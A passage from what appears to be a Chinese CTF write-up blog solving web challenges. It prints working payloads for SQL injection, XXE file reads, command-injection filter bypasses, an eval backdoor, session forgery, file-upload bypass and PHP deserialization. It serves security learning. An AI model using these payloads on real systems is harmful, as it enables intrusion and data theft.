class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">$😀=&quot;a&quot;;  </span><br><span class=\"line\">$😁=&quot;b&quot;;  </span><br><span class=\"line\">$😂=&quot;c&quot;;  </span><br><span class=\"line\">$🤣=&quot;d&quot;;  </span><br><span class=\"line\">$😃=&quot;e&quot;;  </span><br><span class=\"line\">$😄=&quot;f&quot;;  </span><br><span class=\"line\">$😅=&quot;g&quot;;  </span><br><span class=\"line\">$😆=&quot;h&quot;;  </span><br><span class=\"line\">$😉=&quot;i&quot;;  </span><br><span class=\"line\">$😊=&quot;j&quot;;  </span><br><span class=\"line\">$😋=&quot;k&quot;;  </span><br><span class=\"line\">$😎=&quot;l&quot;;  </span><br><span class=\"line\">$😍=&quot;m&quot;;  </span><br><span class=\"line\">$😘=&quot;n&quot;;  </span><br><span class=\"line\">$😗=&quot;o&quot;;  </span><br><span class=\"line\">$😙=&quot;p&quot;;  </span><br><span class=\"line\">$😚=&quot;q&quot;;  </span><br><span class=\"line\">$🙂=&quot;r&quot;;  </span><br><span class=\"line\">$🤗=&quot;s&quot;;  </span><br><span class=\"line\">$🤩=&quot;t&quot;;  </span><br><span class=\"line\">$🤔=&quot;u&quot;;  </span><br><span class=\"line\">$🤨=&quot;v&quot;;  </span><br><span class=\"line\">$😐=&quot;w&quot;;  </span><br><span class=\"line\">$😑=&quot;x&quot;;  </span><br><span class=\"line\">$😶=&quot;y&quot;;  </span><br><span class=\"line\">$🙄=&quot;z&quot;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if (isset($_GET[&#x27;👽&#x27;])) &#123;  </span><br><span class=\"line\">    eval($😭($_GET[&#x27;👽&#x27;]));  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>拿去解析一下就能知道这个😭是什么意思然后直接使用👽=cat /flag.txt 即可</p>\n<h5 id=\"湖湘杯-2021-finalpenetratable\"><a class=\"anchor\" href=\"#湖湘杯-2021-finalpenetratable\">#</a> [湖湘杯 2021 final] Penetratable</h5>\n<p>这个题对我来说真的有难度，这个题的步骤是这样的，一开始进行目录扫描，扫到了 phpinfo.php 和一些没有用的，看源码 static 可以看到很多 js 代码，这些 js 代码里面有一个 req 可以查看到账号信息和调用函数，知道了 admin 账号能够修改账号密码，root 用户能够下载文件，user 和 app 用户什么都干不了，那我们首先的目标是是看 admin 上面有没有突破口了。经过多次尝试可以使用 admin&quot;# 来创建用户冒牌一下 admin 账号然后修改 admin 的账号密码就能登录 admin 了，然后通过 admin 来修改 root 账号的密码 name 要 base64 加密，newpass 要 md5 加密 old 也是 md5，然后 pass 要 base64，修改成功后登录 root 账号查看 phpinfo 的内容满足 pass 里面的 get 然后利用下面那个执行命令，发现 catflag 没有权限 flag 文件权限比较高，我们使用 find 查看一下什么有权限查看到了 sed 可以使用，即可得到 flag 如 sed ‘p1’ /flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function updatePass()&#123;</span><br><span class=\"line\">    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))</span><br><span class=\"line\">    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;</span><br><span class=\"line\">    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;</span><br><span class=\"line\">    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))</span><br><span class=\"line\">    // $.ajax(&#123;</span><br><span class=\"line\">    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,</span><br><span class=\"line\">    //     type: &#x27;post&#x27;,</span><br><span class=\"line\">    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,</span><br><span class=\"line\">    //     // async:true,</span><br><span class=\"line\">    //     dataType: &#x27;text&#x27;,</span><br><span class=\"line\">    //     success: function(data)&#123;</span><br><span class=\"line\">    //         alertHandle(data);</span><br><span class=\"line\">    //     &#125;</span><br><span class=\"line\">    // &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nssround13-basicflaskjwt\"><a class=\"anchor\" href=\"#nssround13-basicflaskjwt\">#</a> [NSSRound#13 Basic]flask?jwt?</h5>\n<p>题目告诉的很直白，就是 jwt 伪造，你使用常规方法直接进行伪造即可把 id 改为 1</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -c &quot;.eJwlzjEOwyAMBdC7MHewDQSTy0QY-6tdSTNVvXsjdX7L-6QDK85n2t_rikc6Xp72tHmTETEyuJSKqdypOZSUkatgRDMDKDAKK7oP0YYpRnNwc-79VqMhUChXEHNlabNWLTmrqAtvpiiNuumEmnJkJ3Zwdu_pjlxnrP9G0vcHIa0wBg.ZVRcxg.NZTyqvJ1HndRRn26eNYQ0gJryU8&quot;</span><br></pre></td></tr></table></figure></p>\n<p>[GWCTF 2019] 枯燥的抽奖</p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class=\"line\">str2 = &#x27;iiOj12Cfzb&#x27;</span><br><span class=\"line\">res = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">for char in str2:</span><br><span class=\"line\">    index = str1.find(char)</span><br><span class=\"line\">    res += str(index) + &#x27; &#x27; + str(index) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(res)</span><br></pre></td></tr></table></figure></p>\n<p>得到序列在通过 php_rand 去爆破种子得到种子在通过他得加密方法就可得到 $str</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">mt_srand(61046797);</span><br><span class=\"line\">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class=\"line\">$str=&#x27;&#x27;;</span><br><span class=\"line\">$len1=20;</span><br><span class=\"line\">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class=\"line\">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$str_show = substr($str, 0, 10);</span><br><span class=\"line\">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023细狗20\"><a class=\"anchor\" href=\"#fsctf-2023细狗20\">#</a> [FSCTF 2023] 细狗 2.0</h5>\n<p>直接使用 1;ls 可以发现有内容，然后使用 ls / 不行代表空格不能使用，那么我们使用 ${IFS} 来代替空格，然后在使用 cat 发现也不行要么使用 c\\at 要么使用 nl 即可然后就可以利用正则来匹配如 /f*</p>\n<h5 id=\"moectf-2021do-you-know-http\"><a class=\"anchor\" href=\"#moectf-2021do-you-know-http\">#</a> [MoeCTF 2021]Do you know HTTP</h5>\n<p>使用常规 header 即可得到 flag，注意我得 burp 不知道为什么发送这种请求只有第一次可以</p>\n<h5 id=\"nssctf-2022-spring-recruitbabysql\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitbabysql\">#</a> [NSSCTF 2022 Spring Recruit]babysql</h5>\n<p>使用常规 sql 注入发现不行并且提示了给了我们一个说明过滤符号不行，那我们可以尝试一下其他办法比如我这里使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/database())&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;test&#x27;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)&#x27;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"羊城杯-2020blackcat\"><a class=\"anchor\" href=\"#羊城杯-2020blackcat\">#</a> [羊城杯 2020] Blackcat</h5>\n<p>下载音频使用 010 才能查看到源码，看到源码后可以发现漏洞函数使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br><span class=\"line\">&amp;White-cat-monitor[]=1&amp;One-ear=;cat flag.php</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hubuctf-2022-新生赛ezsql\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛ezsql\">#</a> [HUBUCTF 2022 新生赛] ezsql</h5>\n<p>admin 账号爆破密码为 iamcool 即可得到 flag 或者<br />\n整体思路为 update 注入，常见于修改用户数据的场景<br />\n这里注入并不需要单引号，直接拼凑 sql 语句<br />\n结合 updata 特性，常规操作爆一爆字段，表，列<br />\n拿不到 admin 密码就修改<br />\n（flag 在 description 中，为避免重开环境，可在 nickname 回显）</p>\n<h5 id=\"hnctf-2022-week2easy_unser\"><a class=\"anchor\" href=\"#hnctf-2022-week2easy_unser\">#</a> [HNCTF 2022 WEEK2]easy_unser</h5>\n<p>考点在于利用初始化函数来绕过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class body&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private $want,$todonothing = &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function  __construct($want)&#123;</span><br><span class=\"line\">        $About_me = &quot;&quot;;</span><br><span class=\"line\">        if($want !== &quot; &quot;) $this-&gt;want = $want;</span><br><span class=\"line\">        else $this-&gt;want = $this-&gt;todonothing;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$f = &quot;php://filter/convert.base64-encode/resource=f14g.php&quot;;</span><br><span class=\"line\">// 伪协议可以绕过is_file()函数, 并且还不等于f14g.php</span><br><span class=\"line\">$a = new body($f);</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\">$c = preg_replace(&quot;/:2:&#123;/&quot;,&quot;:3:&#123;&quot;,$b);</span><br><span class=\"line\">echo urlencode($c);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"sctf-2021loginme\"><a class=\"anchor\" href=\"#sctf-2021loginme\">#</a> [SCTF 2021]loginme</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看结构体里面的使用X-Real-ip来伪造本地ip然后使用查看源码结构题能看出他的id=0,age=一个模块</span><br><span class=\"line\">使用age=&#123;&#123;.Password&#125;&#125;可以得到flag</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023ez_eval\"><a class=\"anchor\" href=\"#fsctf-2023ez_eval\">#</a> [FSCTF 2023]EZ_eval</h5>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script%0alanguage=&#x27;php&#x27;&gt;system(&#x27;c\\at$&#123;IFS&#125;/f*&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>过滤了空格和注意他的 &lt;? 即可绕过<br />\n新知识 paste 可以查看文件</p>\n<h5 id=\"csawqual-2019unagi\"><a class=\"anchor\" href=\"#csawqual-2019unagi\">#</a> [CSAWQual 2019]Unagi</h5>\n<p>页面一直在提示这是一个 xml 上传漏洞并且 flag 就在 /flag 那，那直接构造恶意 xxe 试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE users [</span><br><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class=\"line\">&lt;users&gt;</span><br><span class=\"line\">    &lt;user&gt;</span><br><span class=\"line\">        &lt;username&gt;bob&lt;/username&gt;</span><br><span class=\"line\">        &lt;password&gt;passwd2&lt;/password&gt;</span><br><span class=\"line\">        &lt;name&gt; Bob&lt;/name&gt;</span><br><span class=\"line\">        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  </span><br><span class=\"line\">        &lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class=\"line\">        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class=\"line\">    &lt;/user&gt;</span><br><span class=\"line\">&lt;/users&gt;</span><br></pre></td></tr></table></figure></p>\n<p>直接报错不行<br />\n那么使用加密试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt; ? x m l   v e r s i o n = &#x27; 1 . 0 &#x27; ? &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; ! D O C T Y P E   u s e r s   [ </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; ! E N T I T Y   x x e   S Y S T E M   &quot; f i l e : / / / f l a g &quot;   &gt; ] &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; u s e r s &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">        &lt; u s e r &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; u s e r n a m e &gt; b o b &lt; / u s e r n a m e &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; p a s s w o r d &gt; p a s s w d 2 &lt; / p a s s w o r d &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; n a m e &gt;   B o b &lt; / n a m e &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; e m a i l &gt; b o b @ f a k e s i t e . c o m &lt; / e m a i l &gt;     </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; g r o u p &gt; C S A W 2 0 1 9 &lt; / g r o u p &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; i n t r o &gt; &amp; x x e ; &lt; / i n t r o &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">        &lt; / u s e r &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; / u s e r s &gt;</span><br></pre></td></tr></table></figure></p>\n<p>直接得到 flag</p>\n<h5 id=\"nssctf-2ndphp签到\"><a class=\"anchor\" href=\"#nssctf-2ndphp签到\">#</a> [NSSCTF 2nd] php 签到</h5>\n<p>注意查看代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">  </span><br><span class=\"line\">function waf($filename)&#123;    $black_list = array(&quot;ph&quot;, &quot;htaccess&quot;, &quot;ini&quot;);   </span><br><span class=\"line\">$ext = pathinfo($filename, PATHINFO_EXTENSION);  </span><br><span class=\"line\">    foreach ($black_list as $value) &#123;  </span><br><span class=\"line\">        if (stristr($ext, $value))&#123;  </span><br><span class=\"line\">            return false;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    return true;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if(isset($_FILES[&#x27;file&#x27;]))&#123;    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);  </span><br><span class=\"line\">    if(waf($filename))&#123;        file_put_contents($filename, $content);  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;Please re-upload&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; else&#123;    highlight_file(__FILE__);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&quot;http://node5.anna.nssctf.cn:28748/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">file_content = &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">file = &#123;&#x27;file&#x27;: (&#x27;1.php%2f.&#x27;, file_content)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(url, files=file)</span><br><span class=\"line\"></span><br><span class=\"line\">print(response.text)</span><br></pre></td></tr></table></figure></p>\n<p>直接使用这个即可上传一个 1.php/. 上去</p>\n<h5 id=\"october-2019twice-sql-injection\"><a class=\"anchor\" href=\"#october-2019twice-sql-injection\">#</a> [October 2019]Twice SQL Injection</h5>\n<p>二次注入，注入点在那个注册哪里然后到 login 那里面实现注入，首先需要</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select database()# </span><br><span class=\"line\">1&#x27; union select group_concat(table_name) from information_schema.tables where database()=table_schema# </span><br><span class=\"line\">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;# </span><br><span class=\"line\">1&#x27; union select group_concat(flag) from flag#</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ezhttp\"><a class=\"anchor\" href=\"#ezhttp\">#</a> EzHttp</h5>\n<p>这个题打开后难点在于代理这里你需要使用 via 学到新知识点，并且在添加 server 处如果有下划线的情况下需要使用把前面的下划线内容去掉</p>\n<h5 id=\"n00b_upload\"><a class=\"anchor\" href=\"#n00b_upload\">#</a> n00b_Upload</h5>\n<p>这个题只是过滤了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个题过滤了php但是我们依旧可以直接上传文件注意内容里面不要有php即可</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"easy_php\"><a class=\"anchor\" href=\"#easy_php\">#</a> easy_php</h5>\n<p>这个题注意下划线使用 [替代</p>\n<h5 id=\"广东强网杯-2021-团队组love_pokemon\"><a class=\"anchor\" href=\"#广东强网杯-2021-团队组love_pokemon\">#</a> [广东强网杯 2021 团队组] love_Pokemon</h5>\n<p>使用 od 来得到他的 8 进制字符串，然后在使用 python 写一个脚本恢复原本的字符串即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dump = &quot;0000000 066146 063541 067173 057551 064541 073537 057557 067567 0000020 060537 057551 064556 066537 074151 062565 064542 063556 0000040 064143 067145 057547 064564 067141 064555 064555 005175 0000060&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">b=&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">octs = [(&quot;0o&quot; + n) for n in  dump.split(&quot; &quot;) if n]</span><br><span class=\"line\"></span><br><span class=\"line\">hexs = [int(n, 8) for n in octs]</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">result = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for n in hexs:</span><br><span class=\"line\"></span><br><span class=\"line\">    if (len(hex(n)) &gt; 4):</span><br><span class=\"line\"></span><br><span class=\"line\">        swapped = hex(((n &lt;&lt; 8) | (n &gt;&gt; 8)) &amp; 0xFFFF)</span><br><span class=\"line\"></span><br><span class=\"line\">        result += swapped[2:].zfill(4)</span><br><span class=\"line\"></span><br><span class=\"line\">print(hexs)</span><br><span class=\"line\"></span><br><span class=\"line\">print(bytes.fromhex(result))</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"uuctf-2022-新生赛ezsql\"><a class=\"anchor\" href=\"#uuctf-2022-新生赛ezsql\">#</a> [UUCTF 2022 新生赛] ezsql</h5>\n<blockquote>\n<p>这个题就是一个 sql 注入但是过滤了 or 并且使用了逆反，导致你每次 sql 语句必须在逆反一下才行使用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先构造语句1&#x27;)union select 1,2,3#然后逆转发现没有回显</span><br><span class=\"line\">那我们构造1&#x27;)union select 1,2#后可以得到回显并且显示了pass在2那我们直接使用2来构造一个payload首先爆出数据库</span><br><span class=\"line\">1&#x27;)union select 1,database()#得到数据库UUCTF</span><br><span class=\"line\">在通过information来爆出表,需要注意的点是or被过滤了也代表了from逆转后的morf不能通过，那我们只有使用双写来达到绕过办法</span><br><span class=\"line\">1&#x27;)union select 1,tabase_name frroon information_schema.tables where table_schema=database()#</span><br><span class=\"line\">之后就得到了表名flag之后我们就要去获取他的字段</span><br><span class=\"line\">1&#x27;)union select 1,column_name frronn information_schema.columns where column_schema=&#x27;flag&#x27;#</span><br><span class=\"line\">然后就得到了字段为UUCTF之后直接爆字段内容</span><br><span class=\"line\">1&#x27;)union select 1,UUCTF frroon flag#</span><br><span class=\"line\">然后得到flag</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023ez_php1\"><a class=\"anchor\" href=\"#fsctf-2023ez_php1\">#</a> [FSCTF 2023]ez_php1</h5>\n<blockquote>\n<p>满足第一个 php 语法然后再去满足第二个语法，比较难的就是最后一个需要让 new class-&gt;b=&amp;new class-&gt;a</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Clazz</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $a;</span><br><span class=\"line\">    public $b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$c=new Clazz();</span><br><span class=\"line\">$c-&gt;b=&amp;$c-&gt;a;</span><br><span class=\"line\">echo serialize($c);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2023-秋季新生赛if_else\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛if_else\">#</a> [SWPUCTF 2023 秋季新生赛] If_else</h5>\n<blockquote>\n<p>没见过这么好的要求让我们自己来操作他的代码 if 判断，那就按照 sql 注入的套路去直接执行命令即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">比如让他的if变成if(1)system(&#x27;ls&#x27;);\\*就能使用命令</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023巴巴托斯\"><a class=\"anchor\" href=\"#fsctf-2023巴巴托斯\">#</a> [FSCTF 2023] 巴巴托斯！</h5>\n<blockquote>\n<p>按照提示输入他的要求后发现没有其他显示在试试 /etc/passwd 发现能够查看到文件内容，那就很直接的目录查看或者使用 php 伪协议直接读取 flag.php 即可</p>\n</blockquote>\n<h5 id=\"swpu-2018simplephp\"><a class=\"anchor\" href=\"#swpu-2018simplephp\">#</a> [SWPU 2018]SimplePHP</h5>\n<blockquote>\n<p>这个题讲究方法绕过可以利用 preg_match 的绕过比如回溯超出和 %02 截断<br />\n有坑点就是 flag 我找半天找不到太离谱了</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/cat%20/home/rceservice/flag</span><br></pre></td></tr></table></figure></p>\n<h5 